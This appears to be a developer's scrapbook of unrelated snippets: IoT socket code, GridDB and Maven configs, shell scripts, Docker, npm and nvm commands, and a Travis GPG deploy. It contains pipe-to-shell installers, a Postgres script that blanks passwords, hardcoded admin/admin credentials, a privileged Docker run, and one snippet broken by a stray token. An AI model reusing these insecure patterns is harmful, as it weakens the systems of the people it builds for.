                if r.status_code != 204:
                    raise Exception("data not written")
                payload = ""
            except:
                problem_counter += 1
                print('cannot write to InfluxDB')
                if problem_counter == MAX_LINES_HISTORY:
                    problem_counter = 0
                    payload = ""

        counter += 1

        # wait for selected time
        time_diff_ms = int(time.time()*1000) - unix_time_ms
        print(time_diff_ms)
        if time_diff_ms < READING_DATA_PERIOD_MS:
            time.sleep((READING_DATA_PERIOD_MS - time_diff_ms)/1000.0)


if __name__ == "__main__":
    main()
==============================================================================================================
/*
IOStash IoT PaaS Platform Library for Nodejs v2.0
Copyright (c) 2018 Aravind VS
https://iostash.io
*/


var io = require('socket.io-client')
var colors = require('colors');
var async = require('async');
var _ = require('lodash');
var socket = null
var logs = false;
var API_URL = 'api.iostash.io:82';

function iostash(options) {
    var opts = options;
    var logs = opts.debugLogs || false;
    this.subscriptionManager = {
        authenticated: false,
        connected: false,
        subscriptions: [],
        addSubscription: function(event, id) {
            this.subscriptions.push({ event: event, id: id });
        },
        removeSubscription: function(event, id) {
            _.remove(this.subscriptions, function(currentObject) {
                return (currentObject.event === event && currentObject.id === id);
            });
        },
        checkSubscription: function(event, id) {
            return _.some(this.subscriptions, function(subscription) {
                return subscription.event == event && subscription.id == id;
            })
        }
    };

    var self = this;

    function _log(message) {
        if (logs)
            console.log('[IOStash]'.green, message)
    }

    function _error(message) {
        console.log('[IOStash]'.red, message)
    }

    if (!opts.accessToken || opts.accessToken.length < 10)
        _error('Invalid token specified')
    else {
        _log('Attempting connection')
        socket = io(API_URL, { reconnection: opts.autoReconnect || true, reconnectionDelayMax: opts.retryDelay || 500, reconnectionAttempts: opts.retryAttempts || 10 });
        socket.on('connect', function() {
            _log('Connected, authenticating')
            self.subscriptionManager.connected = true;
            socket.emit('authenticate', { accessToken: opts.accessToken });
            socket.on('disconnect', function() {
                self.subscriptionManager.connected = false;
                _error('Connection closed')
            });

            socket.on('authenticated', function(data) {
                self.subscriptionManager.authenticated = true;
                _log('Auth successful')
                async.each(self.subscriptionManager.subscriptions, function(subscription) {
                    socket.emit(subscription.event, subscription.id)
                })
            });

            socket.on('unauthorized', function(e) {
                _error('Auth failed - Invalid access token')
                self.subscriptionManager.authenticated = false;
            });
        });

        socket.on('reconnect_failed', function(e) {
            _error('Reconnection attempts failed. Please check your network connection')
            self.subscriptionManager.authenticated = false;
        })

    }
}

iostash.prototype.subscribeDevice = function(deviceId, callback) {
    socket.emit('subscribeDevice', deviceId)
    this.subscriptionManager.addSubscription('subscribeDevice', deviceId);
    socket.on('devicesubscriptionFailed' + deviceId, function(data) {
        _error('Subscription to ' + deviceId.yellow + ' failed: ' + data)
        callback(data)
    })
    socket.on('deviceUpdate' + deviceId, function(data) {
        callback(null, data)
    })
}

iostash.prototype.unsubscribeDevice = function(deviceId, callback) {
    socket.emit('unsubscribeDevice', deviceId)
    socket.on('deviceUnsubcribed/#' + socket.id, function(data) {
        this.subscriptionManager.removeSubscription('subscribeDevice', deviceId);
        callback(data)
    })
}

iostash.prototype.subscribeChannel = function(channelId, callback) {
    socket.emit('channelSubscribe', channelId)
    this.subscriptionManager.addSubscription('channelSubscribe', channelId);
    socket.on('channelsubscriptionFailed' + channelId, function(data) {
        callback(data)
    })
    socket.on('channelUpdate' + channelId, function(data) {
        callback(null, data)
    })
}

iostash.prototype.unsubscribeChannel = function(channelId, callback) {
    socket.emit('channelUnsubscribe', channelId)
    socket.on('channelunsubcribed/#' + socket.id, function(data) {
        this.subscriptionManager.removeSubscription('channelSubscribe', channelId);
        callback(data)
    })
}

iostash.prototype.subscribeDataPoint = function(deviceId, dataPointName, callback) {
    socket.emit('subscribeDevice', deviceId)
    socket.emit('subscribeDataPoint', { 'deviceID': deviceId, 'dataPoint': dataPointName })
    this.subscriptionManager.addSubscription('subscribeDataPoint', { 'deviceID': deviceId, 'dataPoint': dataPointName });
    socket.on('datapointsubscriptionFailed' + deviceId + dataPointName, function(data) {
        callback(data)
    })
    socket.on('dataPointUpdate' + deviceId + dataPointName, function(data) {
        callback(null, data)
    })
}

iostash.prototype.unsubscribeDataPoint = function(deviceId, dataPointName, callback) {
    socket.emit('unsubscribeDataPoint', deviceId + dataPointName)
    socket.on('dataPointUpdateUnsubscribed/#' + socket.id, function(data) {
        this.subscriptionManager.removeSubscription('subscribeDataPoint', { 'deviceID': deviceId, 'dataPoint': dataPointName });
        callback(data)
    })
}

iostash.prototype.subscribeCustomData = function(deviceId, callback) {
    if (!this.subscriptionManager.checkSubscription('subscribeDevice', deviceId)) {
        socket.emit('subscribeDevice', deviceId)
        this.subscriptionManager.addSubscription('subscribeDevice', deviceId);
    }
    socket.on('publish' + deviceId, function(data) {
        callback(null, data)
    })
}

iostash.prototype.subscribeLocation = function(deviceId, callback) {
    if (!this.subscriptionManager.checkSubscription('subscribeDevice', deviceId)) {
        socket.emit('subscribeDevice', deviceId)
        this.subscriptionManager.addSubscription('subscribeDevice', deviceId);
    }
    socket.on('newlocationUpdate' + deviceId, function(data) {
        callback(null, data)
    })
}

iostash.prototype.subscribeActions = function(deviceId, callback) {
    if (!this.subscriptionManager.checkSubscription('subscribeDevice', deviceId)) {
        socket.emit('subscribeDevice', deviceId)
        this.subscriptionManager.addSubscription('subscribeDevice', deviceId);
    }
    socket.on('action' + deviceId, function(data) {
        callback(null, data)
    })
}

iostash.prototype.getConnectionStatus = function() {
    return this.subscriptionManager.connected;
}

iostash.prototype.connectionDropped = function(callback) {
    socket.on('disconnect', function() {
        callback('Connection dropped');
    });
}

iostash.prototype.connectionFatal = function(callback) {
    socket.on('reconnect_failed', function(e) {
        callback('Cannot establish connection, please check your network')
    })
}

module.exports = iostash;
=========================================================================================================
java -Xms512m -Xmx2048m -ea -cp $CP edu.mit.csail.sdg.alloy4whole.SimpleGUI
    find $DST/alloy -type d -name ".svn" | xargs rm -rf 
    find $DST/alloy -type d -name "CVS" | xargs rm -rf 
=========================================================================================================
import com.toshiba.mwcloud.gs.GSException;
import com.toshiba.mwcloud.gs.GridStore;
import com.toshiba.mwcloud.gs.GridStoreFactory;
import com.toshiba.mwcloud.gs.RowKey;
import com.toshiba.mwcloud.gs.RowSet;
import com.toshiba.mwcloud.gs.TimeSeries;
import com.toshiba.mwcloud.gs.TimestampUtils;
import com.toshiba.mwcloud.gs.TimeUnit;
import com.toshiba.mwcloud.gs.Collection;

public class Init {

	static class Point {
		@RowKey Date timestamp;
		long deviceId;
	}

	static class Device {
		@RowKey long id;
		long userId;
		long year;
	}
	
	public static void main(String[] args) throws GSException {

		Properties props = new Properties();
		props.setProperty("notificationAddress", args[0]);
		props.setProperty("notificationPort", args[1]);
		props.setProperty("clusterName", args[2]);
		props.setProperty("user", "admin");
		props.setProperty("password", "admin");
		GridStore store = GridStoreFactory.getInstance().getGridStore(props);

		//---------------------------------------------
		
		TimeSeries<Point> ts = store.putTimeSeries("point01", Point.class);

		Point point = new Point();
		
		point.timestamp = TimestampUtils.current();
		point.deviceId = 144012;
		ts.put(point);
		
		point.timestamp = TimestampUtils.add(point.timestamp, 1, TimeUnit.SECOND);
		point.deviceId = 24485;
		ts.put(point);
		
		point.timestamp = TimestampUtils.add(point.timestamp, 1, TimeUnit.SECOND);
		point.deviceId = 30292;
		ts.put(point);
		
		point.timestamp = TimestampUtils.add(point.timestamp, 1, TimeUnit.SECOND);
		point.deviceId = 24485;
		ts.put(point);
		
		//---------------------------------------------
		
		Collection<Long, Device> col = store.putCollection("devices", Device.class);

		Device device = new Device();

		device.id = 30292;
		device.userId = 47;
		device.year = 2015;
		col.put(device);
		
		device.id = 107624;
		device.userId = 86;
		device.year = 2016;
		col.put(device);
		
		device.id = 121150;
		device.userId = 47;
		device.year = 2017;
		col.put(device);
		
		device.id = 22975;
		device.userId = 86;
		device.year = 2014;
		col.put(device);
		
		device.id =  144012;
		device.userId = 122;
		device.year = 2017;
		col.put(device);
		
		device.id =  90714;
		device.userId = 77;
		device.year = 2016;
		col.put(device);
		
		device.id =  24485;
		device.userId = 1;
		device.year = 2014;
		col.put(device);

		store.close();
	}

}
=========================================================================================================
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
    <appender name="Console"
        class="ch.qos.logback.core.ConsoleAppender">
        <layout class="ch.qos.logback.classic.PatternLayout">
            <Pattern>
                %black(%d{ISO8601}) %highlight(%-5level) [%blue(%t)] %yellow(%C{1.}): %msg%n%throwable
            </Pattern>
        </layout>
    </appender>
 
    <appender name="RollingFile"
        class="ch.qos.logback.core.rolling.RollingFileAppender">
        <file>../log/gs_webapi.log</file>
        <encoder
            class="ch.qos.logback.classic.encoder.PatternLayoutEncoder">
            <Pattern>%d %p %C{1.} [%t] %m%n</Pattern>
        </encoder>
 
        <rollingPolicy
            class="ch.qos.logback.core.rolling.TimeBasedRollingPolicy">
            <fileNamePattern>../log/gs_webapi-%d{yyyyMMdd}.%i.log
            </fileNamePattern>
            <timeBasedFileNamingAndTriggeringPolicy
                class="ch.qos.logback.core.rolling.SizeAndTimeBasedFNATP">
                <maxFileSize>1MB</maxFileSize>
            </timeBasedFileNamingAndTriggeringPolicy>
        </rollingPolicy>
    </appender>
     
    <!-- LOG everything at INFO level -->
    <root level="info">
        <appender-ref ref="RollingFile" />
        <appender-ref ref="Console" />
    </root>
 
</configuration>
=========================================================================================================
j=0
for i in `find . -maxdepth 1 -type f -name '*.out.txt'`; do
	#echo $i
	#rm $i 
	j=$((j+1))
done
echo $j
=========================================================================================================
	<plugin>
		        <groupId>org.apache.maven.plugins</groupId>
		        <artifactId>maven-clean-plugin</artifactId>
		        <version>2.4.1</version>
				<executions>
					<execution>
						<id>default-clean</id>
						<configuration>
							<excludeDefaultDirectories>true</excludeDefaultDirectories>
							<filesets>
								<fileset>
									<directory>${basedir}/../griddb-binding/lib</directory>
									<includes>
										<include>${basedir}/../griddb-binding/lib/griddb-binding.jar</include>
									</includes>							
									<excludes>
										<exclude>${basedir}/../griddb-binding/lib/gridstore.jar</exclude>
									</excludes>
									<followSymlinks>false</followSymlinks>
								</fileset>
							</filesets>
						</configuration>
						<goals>
							<goal>clean</goal>
						</goals>
					</execution>
				</executions>
			</plugin>
=========================================================================================================
<dependency>
			<groupId>com.toshiba.mwcloud.gs</groupId>
			<artifactId>gridstore</artifactId>
			<version>${gridstore.version}</version>
			<scope>system</scope>
			<systemPath>${basedir}/../griddb-binding/lib/gridstore.jar</systemPath>
		</dependency>
=========================================================================================================
=========================================================================================================
=========================================================================================================
=========================================================================================================
=========================================================================================================
=========================================================================================================
=========================================================================================================
=========================================================================================================
=========================================================================================================
=========================================================================================================
output=Merged_$(date +%Y-%m-%d-%H-%M-%S).txt
##Header is common among all files

files=`find . -maxdepth 1 -type f -name '*.out.txt'`
files_arr=($files)

header=`head -n 1 "${files_arr[0]}"`
echo $header > "$output"

for file in $files; do
	sed "/$header/d" "$file" >> "$output"
done

sed -i 's/_IMPLY_/,imply,/' "$output"
sed -i 's/_IMPLY_/,and,/' "$output"
=========================================================================================================
grep '^-1,' "$1"  | sed 's/-1,-1,-1,-1,-1,-1,-1,//' | sed 'p;s/$/.als.out.txt.timedout/' | sed 's/_$/_.als.out.txt/' | xargs -n2 mv
=========================================================================================================
#classpath=/Users/vajih/Documents/workspace-git/alloy/bin:/Users/vajih/Documents/workspace-git/lib-sdg/jars-external/sat4j.jar:/Users/vajih/Documents/workspace-git/alloy/lib/apple-osx-ui.jar:/Users/vajih/Documents/workspace-git/alloy/lib/extra.jar:/Users/vajih/Documents/workspace-git/lib-sdg/jars-sdg/kodkod-int-overflow.jar:/Users/vajih/Downloads/eclipse/plugins/org.junit_4.11.0.v201303080030/junit.jar:/Users/vajih/Downloads/eclipse/plugins/org.hamcrest.core_1.3.0.v201303031735.jar:/Users/vajih/Documents/workspace-git/debugger-experiment/lib/alloy4.2.jar:/Users/vajih/Documents/workspace-git/lib-sdg/jars-external/rt.jar:/Users/vajih/Documents/workspace-git/lib-sdg/jars-external/functionaljava-3.0.jar:/Users/vajih/Documents/workspace-git/alloy/lib/guava-18.0.jar:/Users/vajih/Documents/workspace-git/alloy/lib/reflections-0.10-SNAPSHOT-jar-with-dependencies.jar
xms=1024m
xmx=4096m

CP=$(ls -1 dist/*.jar | xargs | sed "s/\ /:/g"):$(ls -1 lib/*.jar | xargs | sed "s/\ /:/g")

echo $CP
#CP=$CP:classes:$(ls -1 dist/*.jar | xargs | sed "s/\ /:/g")

java -Xmx$xmx -Xms$xms -Djava.util.logging.config.file=resources/java.logger.monitor.config  -cp $CP edu.uw.ece.alloy.debugger.propgen.benchmarker.center.TemporalAnalyzerRunner 

echo $classpath
=========================================================================================================
#!/bin/bash
# file: clean.sh

echo "Kill all the previous H2 Databases."
while read p; do
  kill $p
done <scripts/processID.log

sleep 1

echo "Remove the database IDs"
rm scripts/processID.log

echo "Remove the previous database logs"
#rm db/alloy_props*
pushd db
 find alloy_props* -type f -delete
popd

echo "Remove all the temporary generated files."
#rm relational_props/tmp/*
pushd relational_props/tmp/
find . -type f -delete
popd 

echo "Remove all the java logs."
#rm tmp/*.log*
pushd tmp
find *.log* -type f -delete
popd


echo "Start H2 database"
java -cp lib/h2*.jar org.h2.tools.Server & 
pID=`echo $!`
echo "A H2 database created as the process id:" $pID
echo $pID >> scripts/processID.log

echo "REDAY TO START THE FRAMEWORK............"
=========================================================================================================
npm install -g ganache-cli@6.1.0
npm install -g truffle@0.0.0
truffle init
=========================================================================================================
yarn policies set-version will download the latest stable release
yarn policies set-version --rc will download the latest rc release
yarn policies set-version 1.13.0 will download a specific version
yarn policies set-version '^1.12.0' will download the latest minor
=========================================================================================================
Install dependencies and run the app
yarn install;
yarn run dev;
Open the app in your browser at http://localhost:8000
open -a "Google Chrome" http://localhost:8000
==============================================================================================================
docker run alpine env
docker version
https://docs.docker.com/docker-for-windows/dashboard/
==============================================================================================================
https://github.com/GladysAssistant/Gladys
https://documentation.gladysassistant.com/en/installation#raspberry-pi

curl -sSL https://get.docker.com | sh
sudo usermod -aG docker pi

docker run -d \
--restart=always \
--privileged \
--network=host \
--name gladys \
-e NODE_ENV=production \
-e SERVER_PORT=80 \
-e TZ=Europe/Paris \
-e SQLITE_FILE_PATH=/var/lib/gladysassistant/gladys-production.db \
-v /var/run/docker.sock:/var/run/docker.sock \
-v /var/lib/gladysassistant:/var/lib/gladysassistant \
-v /dev:/dev \
gladysassistant/gladys:4.0.0-beta-arm

docker run -d \
  --name watchtower \
  --restart=always \
  -v /var/run/docker.sock:/var/run/docker.sock \
  containrrr/watchtower:armhf-latest \
  --cleanup
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
single-spa-parcel-example
This project is an example of web app built with multiple microfrontends running in different VM's using the single-spa framework.

To run this example in development mode use:
Have a Mongo DB running in port 27017
Inside each folder (sample-api, sample-api2, sample-vue, sample-react, sample-single-spa) run:
npm install
npm run serve
You can access the portal at http://localhost:5000/index.local
To run this example in production use:
inside the environment folder:
docker-compose build
docker-compose up
You can access the portal at http://localhost:5001
==============================================================================================================
git clone git@github.com:CanopyTax/single-spa-examples.git
cd single-spa-examples

# Install yarn at https://yarnpkg.com/lang/en/docs/install/
yarn
yarn build
yarn start
open http://localhost:8080

https://github.com/single-spa/single-spa-examples
==============================================================================================================
Clone the repo
Run npm run install-all

run npm start

Open running code at http://localhost:8233/
==============================================================================================================
sudo npm install --unsafe-perm --verbose -g ethereumjs-testrpc
nvm install --lts nvm use --lts
npm install --global --production windows-build-tools
sed -i -e 's/.\\/build\\/Release\\/scrypt/scrypt/' node_modules/scrypt/index.js
==============================================================================================================
const localStorageMock = {
  getItem: jest.fn(),
  setItem: jest.fn(),
  clear: jest.fn(),
};
global.localStorage = localStorageMock;

window.matchMedia =
  window.matchMedia ||
  function() {orgiori
    return {
      matches: false,
      addListener: function() {},
      removeListener: function() {},
    };
  };

==============================================================================================================
export const handleUpdate = () => null

export function uuidv4() {
  return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
    var r = (Math.random() * 16) | 0,
      v = c === 'x' ? r : (r & 0x3) | 0x8;
    return v.toString(16);
  });
}

==============================================================================================================
curl -o- https://raw.githubusercontent.com/creationix/nvm/v0.35.2/install.sh | bash
wget -qO- https://raw.githubusercontent.com/creationix/nvm/v0.35.2/install.sh | bash

nvm install 12.14.1
nvm ls-remote
nvm ls available
nvm install v12.14.1 --reinstall-packages-from=10.18.1

nvm install node
nvm install --lts
nvm use 13.6.0
nvm use node

nvm use node
nvm unalias awesome-version
nvm alias default 12.14.1

npm install -g --unsafe-perm=false --allow-root
==============================================================================================================
autoload -U add-zsh-hook
load-nvmrc() {
  local node_version="$(nvm version)"
  local nvmrc_path="$(nvm_find_nvmrc)"

  if [ -n "$nvmrc_path" ]; then
    local nvmrc_node_version=$(nvm version "$(cat "${nvmrc_path}")")

    if [ "$nvmrc_node_version" = "N/A" ]; then
      nvm install
    elif [ "$nvmrc_node_version" != "$node_version" ]; then
      nvm use
    fi
  elif [ "$node_version" != "$(nvm version default)" ]; then
    echo "Reverting to nvm default version"
    nvm use default
  fi
}
add-zsh-hook chpwd load-nvmrc
load-nvmrc
==============================================================================================================
{
  "name" : "GitHub Chat",
  "version" : "0.1.2",
  "description" : "Chat and conference with your peers on GitHub",
  "background_page" : "background.html",
  "browser_action" : {
    "default_icon" : "logo-32.png"
  },
  "content_scripts" : [
    {
      "matches" : [
        "http://*/*",
        "https://*/*"
      ],
      "js" : [ "jquery-1.6.2.min.js", "contentscript.js"],
      "run_at" : "document_idle"
    }
  ],
  "icons" : {
    "16" : "logo-16.png",
    "48" : "logo-48.png",
    "128" : "logo-128.png"
  }
}
==============================================================================================================
git clone git@github.com:CanopyTax/single-spa-examples.git
cd single-spa-examples

# Install yarn at https://yarnpkg.com/lang/en/docs/install/
yarn
yarn build
yarn start
open http://localhost:8080
==============================================================================================================
npm show <package> version
npm list -g
npm list --depth=0
npm view <package> version
npm info YOUR_PACKAGE version
node -p "require('./package.json').version"

==============================================================================================================
npm config get sass_binary_path
npm rebuild node-sass
sudo chmod -R 775 /node_modules

npm ls node-sass
node -p process.platform
node -p process.arch
node -p "require('node-sass').info"

npm update
==============================================================================================================
cybaca
Self-driven community event organizer

Prepare
Truffle and ganache-cli should be installed
Bootstrap
npm i
Tests
ganache-cli -p 7545 -a 250 -e 100 -i 5777
Migration
truffle migrate --network development --reset
Code for verification
truffle-flattener contracts/Cybercon.sol > cybercon0_full.sol
==============================================================================================================
#!/bin/bash
wget http://geolite.maxmind.com/download/geoip/database/GeoLite2-City.mmdb.gz
wget http://geolite.maxmind.com/download/geoip/database/GeoLite2-Country.mmdb.gz
gzip -d GeoLite2-City.mmdb.gz && gzip -d GeoLite2-Country.mmdb.gz
mv GeoLite2-*.mmdb helpers/GeoIP2/db/
==============================================================================================================
dc up -d mongo
docker run --env-file ./.env -p 3000:3000 --network reaction.localhost -it test-api:latest
==============================================================================================================
class UsersView extends React.Component {
  render() {
    const {users, UserLink} = this.props

    return (
      <ul>
        {users.map(user => (
          <UserLink key={user.id} user={user}>
            <li>{user.name}</li>
          </UserLink>
        ))}
      </ul>
    ) 
  }
}

const AdminUserLink = ({user, children}) => <Link to={`/admin/users/${user.id}`}>{children}</Link>
const AdminUserList = <UsersView UserLink={AdminUserLink} />

const UserProfileLink = ({user, children}) => <Link to={`/users/${user.id}`}>{children}</Link>
const UserProfileList = <UsersView UserLink={UserProfileLink} />
==============================================================================================================
#!/usr/bin/env bash

RED='\033[0;31m'
GREEN='\033[0;32m'
LBLUE='\033[1;34m'
YELLOW='\033[0;33m'
HIDDEN='\e[8m'
NC='\033[0m'

# Dynamic horizontal spacer
space () {
  if [[ "$NO_PROGRESS" == "1" ]]; then
    return
  fi
  # Check terminal width
  num=`tput cols`
  for i in `seq 1 $num`; do
    echo -n "-"
  done
  echo ""
}

# Checking if asciidoctor is installed
[[ -z $(which asciidoctor) || -z $(which asciidoctor-pdf) ]] && echo -e "${RED}Please install asciidoctor(-pdf) to compile the book${NC}" && exit 1 || echo -e "asciidoctor ${GREEN}installed${NC}, compiling book.pdf and book.html"

space

ADOC_COUNT=$(ls best-practices/*.adoc |wc -l)
BOOK_ADOC_COUNT=$(cat book.adoc|grep include |wc -l)

if [[ $ADOC_COUNT -gt $BOOK_ADOC_COUNT ]]; then
  for adoc in `ls best-practices/*.adoc| cut -f2 -d/`; do
    grep $adoc book.adoc > /dev/null || echo -e "${RED}$adoc is not included in book.adoc${NC} - ${YELLOW}FYI${NC}"
  done
  space
fi

# Compiling book
echo -n -e "Compiling ${GREEN}best-practices-in-threat-intellingence${NC} based on practical ${LBLUE}MISP${NC} experiences."
echo -n -e "${GREEN} PDF "
asciidoctor-pdf book.adoc 2> /dev/null
echo -e "HTML ${NC}"
asciidoctor book.adoc 2> /dev/null
space
echo "Done!"

# If ../misp-website exists, copy over. This is for core MISP maintainers with write access to the website.
[[ -d ../misp-website ]] && cp book.html ../misp-website/best-practices-in-threat-intelligence.html
[[ -d ../misp-website ]] && cp book.pdf  ../misp-website/best-practices-in-threat-intelligence.pdf
==============================================================================================================
-- User: fe_sendauth
-- DROP USER fe_sendauth;

CREATE USER fe_sendauth WITH
  LOGIN
  NOSUPERUSER
  INHERIT
  CREATEDB
  NOCREATEROLE
  NOREPLICATION;

GRANT postgres TO fe_sendauth;

alter role postgres password '';
ALTER ROLE fe_sendauth WITH PASSWORD NULL;
==============================================================================================================
netstat -an |grep LISTEN |grep 6250 |grep -v tcp6 ; check_redis_port=$?
netstat -an |grep LISTEN |grep 8001 |grep -v tcp6 ; check_dashboard_port=$?
==============================================================================================================
pip install -r requirements.txt -r requirements_dev.txt
Creating Database Tables
./manage.py database create_tables
Processes
The main Redash processes you have to run:

Web server
RQ worker(s) & scheduler
In development you will also run Webpack’s dev server or watch utility.

Our recommendation:

Web server: ./manage.py runserver --debugger --reload
RQ: ./manage.py rq worker
RQ Scheduler: ./manage.py rq scheduler
Frontend watch process to rebuild changes: npm run watch
This will result in a Flask web server listening on port 5000, Webpack rebuilding changes to the frontend, RQ worker ready to run queries and RQ scheduler to enqueue periodic tasks.

pytest tests/

==============================================================================================================
from time import clock

by 

from time import perf_counter as clock

try:
    import pwd
except ImportError:
   pwd = None
   import getpass


...

if pwd:
    userName = pwd.getpwuid(os.getuid())[0]
else:
    userName = getpass.getuser()
==============================================================================================================
pip help - помощь по доступным командам.

pip install package_name - установка пакета(ов).

pip uninstall package_name - удаление пакета(ов).

pip list - список установленных пакетов.

pip show package_name - показывает информацию об установленном пакете.

pip search - поиск пакетов по имени.

pip --proxy user:passwd@proxy.server:port - использование с прокси.

pip install -U - обновление пакета(ов).

pip install --force-reinstall - при обновлении, переустановить пакет, даже если он последней версии.

python -m pip install --upgrade pip
pip --no-cache-dir install scipy

pip --no-cache-dir install scipy
[global]
no-cache-dir = false

easy_install http://www.voidspace.org.uk/python/pycrypto-2.6.1/pycrypto-2.6.1.win32-py2.7.exe
==============================================================================================================
mvn --settings .travis/settings.xml install -DskipTests=false -Dgpg.skip -Dmaven.javadoc.skip=true -B -V
==============================================================================================================
#!/usr/bin/env bash

set -e

# only do deployment, when travis detects a new tag
if [ ! -z "$TRAVIS_TAG" ]
then
    echo "on a tag -> set pom.xml <version> to $TRAVIS_TAG"
    mvn --settings .travis/settings.xml org.codehaus.mojo:versions-maven-plugin:2.3:set -DnewVersion=$TRAVIS_TAG -Prelease

    if [ ! -z "$TRAVIS" -a -f "$HOME/.gnupg" ]; then
        shred -v ~/.gnupg/*
        rm -rf ~/.gnupg
    fi

    source .travis/gpg.sh

    mvn clean deploy --settings .travis/settings.xml -DskipTests=true -B -U -Prelease

    if [ ! -z "$TRAVIS" ]; then
        shred -v ~/.gnupg/*
        rm -rf ~/.gnupg
    fi
else
    echo "not on a tag -> keep snapshot version in pom.xml"
fi
==============================================================================================================
#!/usr/bin/env bash

set -e

# create a random passphrase
export GPG_PASSPHRASE=$(echo "$RANDOM$(date)" | md5sum | cut -d\  -f1)

# configuration to generate gpg keys
cat >gen-key-script <<EOF
      %echo Generating a basic OpenPGP key
      Key-Type: RSA
      Key-Length: 4096
      Subkey-Type: 1
      Subkey-Length: 4096
      Name-Real: Opensource Idealo
      Name-Email: opensource-logback-redis@idealo.de
      Expire-Date: 2y
      Passphrase: ${GPG_PASSPHRASE}
      %commit
      %echo done
EOF

# create a local keypair with given configuration
gpg --batch --gen-key gen-key-script


# export created GPG key
#
# example output
# sec   4096R/EDD32E8B 2016-09-08 [verfällt: 2018-09-08]
# uid                  Lars K.W. Gohlke <lars.gohlke@idealo.de>
# ssb   4096R/CC1613B2 2016-09-08
# ssb   4096R/55B7CAA2 2016-09-08
export GPG_KEYNAME=$(gpg -K | grep ^sec | cut -d/  -f2 | cut -d\  -f1 | head -n1)

# cleanup local configuration
shred gen-key-script

# publish the gpg key  (sonatype reads from keyserver.ubuntu.com)
gpg --keyserver keyserver.ubuntu.com --send-keys ${GPG_KEYNAME}

# wait for the key beeing accessible
while(true); do
    date
    gpg --keyserver keyserver.ubuntu.com --recv-keys ${GPG_KEYNAME} && break || sleep 30
done

echo wait for 2minutes to let the key being synced
sleep 120 
==============================================================================================================
docker run --cap-add=NET_ADMIN --rm -v "$(pwd)":/sitespeed.io -e REPLAY=true -e LATENCY=100 sitespeedio/sitespeed.io -n 5 -b chrome https://en.wikipedia.org/wiki/Barack_Obama

docker run --cap-add=NET_ADMIN --rm -v "$(pwd)":/sitespeed.io -e REPLAY=true -e LATENCY=100 sitespeedio/sitespeed.io -n 11 -b firefox https://en.wikipedia.org/wiki/Barack_Obama

npm i -g sitespeed.io
$ git clone https://github.com/sitespeedio/sitespeed.io.git
$ cd sitespeed.io
$ npm install
$ bin/sitespeed.js --help
$ bin/sitespeed.js https://www.sitespeed.io/

Before we start telling you all about sitespeed.io you should just try it out:

$ docker run --rm -v "$(pwd)":/sitespeed.io sitespeedio/sitespeed.io https://www.sitespeed.io/
Or using npm (you need Chrome or Firefox installed)

$ npm i -g sitespeed.io && sitespeed.io https://www.sitespeed.io/
==============================================================================================================
How to generate vault aws role
Create aws secrets backend
command
curl -H "X-Vault-Token: <token>" -X POST -d @mount.json https://<vault-host>/v1/sys/mounts/<aws-secrets-backend>
mount.json
{
 "type": "aws",
  "config": {
    "force_no_cache": true,
    "default_lease_ttl": "10m",
    "max_lease_ttl": "25h"
  }
}
Configure aws secrets backend
command:
curl -H "X-Vault-Token: <token>"  -X POST -d @config.json https://<vault-host>/v1/<aws-secrets-backend>/config/root
config.json:
{
	"access_key": <awsAccessKey>,
	"secret_key": <awsSecretKey>,
	"region": "eu-central-1"
}
Create role
command:
curl -H "X-Vault-Token: <token>"  -X POST -d @role.json https://<vault-host>/v1/<aws-secrets-backend>/roles/<role>
role.json:
{
	"credential_type": "iam_user",
	"policy_arns": <policy-arn>
}
==============================================================================================================
<?xml version="1.0" encoding="UTF-8"?>
<included>
    <shutdownHook class="ch.qos.logback.core.hook.DelayingShutdownHook"/>
    <appender name="REDIS_APPENDER" class="net.logstash.logback.appender.LoggingEventAsyncDisruptorAppender">
        <ringBufferSize>131072</ringBufferSize>
        <waitStrategyType>sleeping</waitStrategyType>
        <appender class="de.idealo.logback.appender.RedisBatchAppender">
            <connectionConfig>
                <!-- redis sentinel: -->
                <scheme>SENTINEL</scheme>
                <sentinelMasterName>mymaster</sentinelMasterName>
                <sentinels>localhost:26379</sentinels>
                <!-- redis node: -->
                <!--<scheme>NODE</scheme>-->
                <!--<host>localhost</host>-->
                <!--<port>6379</port>-->
                <key>logstash</key>
            </connectionConfig>
            <maxBatchMessages>1000</maxBatchMessages>
            <maxBatchSeconds>10</maxBatchSeconds>
            <encoder class="net.logstash.logback.encoder.LoggingEventCompositeJsonEncoder">
                <providers>
                    <mdc/>
                    <pattern>
                        <pattern>
                            {
                            "timestamp": "%d{yyyy-MM-dd'T'HH:mm:ss.SSSZZ}",
                            "message": "%message",
                            "logger": "%logger",
                            "thread": "%thread",
                            "level": "%level",
                            "host": "${HOSTNAME}",
                            "file": "%file",
                            "line": "%line"
                            }
                        </pattern>
                    </pattern>
                    <stackTrace>
                        <throwableConverter class="net.logstash.logback.stacktrace.ShortenedThrowableConverter">
                            <maxDepthPerThrowable>30</maxDepthPerThrowable>
                            <maxLength>4096</maxLength>
                            <shortenedClassNameLength>20</shortenedClassNameLength>
                            <rootCauseFirst>true</rootCauseFirst>
                        </throwableConverter>
                    </stackTrace>
                </providers>
            </encoder>
        </appender>
    </appender>
</included>
==============================================================================================================
<settings xmlns="http://maven.apache.org/SETTINGS/1.0.0"
          xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
          xsi:schemaLocation="http://maven.apache.org/SETTINGS/1.0.0
                      http://maven.apache.org/xsd/settings-1.0.0.xsd">
    <servers>
        <server>
            <!-- Maven Central Deployment -->
            <id>ossrh</id>
            <username>${env.SONATYPE_USERNAME}</username>
            <password>${env.SONATYPE_PASSWORD}</password>
        </server>
    </servers>
    <profiles>
        <profile>
            <id>ossrh</id>
            <activation>
                <activeByDefault>true</activeByDefault>
            </activation>
            <properties>
                <gpg.keyname>${env.GPG_KEYNAME}</gpg.keyname>
                <gpg.executable>gpg</gpg.executable>
                <gpg.passphrase>${env.GPG_PASSPHRASE}</gpg.passphrase>
            </properties>
        </profile>
    </profiles>
</settings>
==============================================================================================================
language: java

jdk:
  - openjdk11

script: mvn --settings .travis/settings.xml clean  verify

deploy:
  -
    provider: script
    script: .travis/deploy.sh
    skip_cleanup: true
    on:
      repo: idealo/logback-redis
      tags: true
      jdk: openjdk11



notifications:
  email:
    - opensource-logback-redis@idealo.de
==============================================================================================================
import org.assertj.core.api.Assertions;
import org.junit.Test;
import org.junit.runner.RunWith;
